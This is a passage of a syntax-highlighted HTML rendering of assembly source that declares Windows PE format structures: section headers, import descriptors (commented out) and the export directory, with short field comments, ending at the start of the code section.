</span><span class="sc5">SH_VirtualAddress</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Virtual address</span><span class="sc0">
</span><span class="sc5">SH_SizeOfRawData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; Raw data size</span><span class="sc0">
</span><span class="sc5">SH_PointerToRawData</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; pointer to raw data</span><span class="sc0">
</span><span class="sc5">SH_PointerToRelocations</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc5">SH_PointerToLinenumbers</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; ...... not really used</span><span class="sc0">
</span><span class="sc5">SH_NumberOfRelocations</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; ....</span><span class="sc0">
</span><span class="sc5">SH_NumberOfLinenumbers</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; ..</span><span class="sc0">
</span><span class="sc5">SH_Characteristics</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; flags</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
                                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;IMAGE_IMPORT_BY_NAME STRUC                  ; Import by name data type</span><span class="sc0">
</span><span class="sc1">;IBN_Hint DW 0                               ; Hint entry</span><span class="sc0">
</span><span class="sc1">;IBN_Name DB 1 DUP (?)                       ; name</span><span class="sc0">
</span><span class="sc1">;IMAGE_IMPORT_BY_NAME ENDS                   ;</span><span class="sc0">
</span><span class="sc1">;                                            ;</span><span class="sc0">
</span><span class="sc1">;IMAGE_THUNK_DATA STRUC                      ; Thunk data</span><span class="sc0">
</span><span class="sc1">;                    UNION                   ;</span><span class="sc0">
</span><span class="sc1">;TD_AddressOfData    DD IMAGE_IMPORT_BY_NAME PTR ? ; Ptr to IMAGE_IMPORT_BY_NAME structure</span><span class="sc0">
</span><span class="sc1">;TD_Ordinal          DD ?                    ; Ordinal ORed with IMAGE_ORDINAL_FLAG</span><span class="sc0">
</span><span class="sc1">;TD_Function         DD BYTE PTR ?           ; Ptr to function (i.e. Function address after program load)</span><span class="sc0">
</span><span class="sc1">;TD_ForwarderString  DD BYTE PTR ?           ; Ptr to a forwarded API function.</span><span class="sc0">
</span><span class="sc1">;                    ENDS                    ;</span><span class="sc0">
</span><span class="sc1">;IMAGE_THUNK_DATA ENDS               ;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;                                    ;</span><span class="sc0">
</span><span class="sc1">;IMAGE_IMPORT_DESCRIPTOR STRUC       ; Import descryptor</span><span class="sc0">
</span><span class="sc1">;                      UNION         ;</span><span class="sc0">
</span><span class="sc1">;ID_Characteristics    DD ?          ; 0 for last null import descriptor</span><span class="sc0">
</span><span class="sc1">;ID_OriginalFirstThunk DD IMAGE_THUNK_DATA PTR ? ; RVA to original unbound IAT</span><span class="sc0">
</span><span class="sc1">;                      ENDS          ;</span><span class="sc0">
</span><span class="sc1">;ID_TimeDateStamp      DD ?          ;</span><span class="sc0">
</span><span class="sc1">;ID_ForwarderChain     DD ?          ; -1 if no forwarders</span><span class="sc0">
</span><span class="sc1">;ID_Name               DD BYTE PTR ? ; RVA to name of imported DLL</span><span class="sc0">
</span><span class="sc1">;ID_FirstThunk         DD IMAGE_THUNK_DATA PTR ?  ; RVA to IAT</span><span class="sc0">
</span><span class="sc1">;IMAGE_IMPORT_DESCRIPTOR ENDS        ;</span><span class="sc0">
</span><span class="sc1">;IMAGE_IMPORT_DESCRIPTOR_SIZE = SIZE IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                </span><span class="sc1">; Export Directory type</span><span class="sc0">
</span><span class="sc5">ED_Characteristics</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Flags</span><span class="sc0">
</span><span class="sc5">ED_TimeDateStamp</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Date / Time</span><span class="sc0">
</span><span class="sc5">ED_MajorVersion</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Major version</span><span class="sc0">
</span><span class="sc5">ED_MinorVersion</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Minor version</span><span class="sc0">
</span><span class="sc5">ED_Name</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Ptr to name of exported DLL</span><span class="sc0">
                          </span><span class="sc9">UNION</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_Base</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc5">ED_BaseOrdinal</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; base ordinal</span><span class="sc0">
                          </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_NumberOfFunctions</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of exported funcs.</span><span class="sc0">
                          </span><span class="sc9">UNION</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_NumberOfNames</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of exported names</span><span class="sc0">
</span><span class="sc5">ED_NumberOfOrdinals</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of exported ordinals</span><span class="sc0">
                          </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_AddressOfFunctions</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Ptr to array of function addresses</span><span class="sc0">
</span><span class="sc5">ED_AddressOfNames</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Ptr to array of (function) name addresses</span><span class="sc0">
                          </span><span class="sc9">UNION</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_AddressOfNameOrdinals</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Ptr to array of name ordinals</span><span class="sc0">
</span><span class="sc5">ED_AddressOfOrdinals</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Ptr to array of ordinals</span><span class="sc0">
                          </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">.code</span></div></body>
</html>
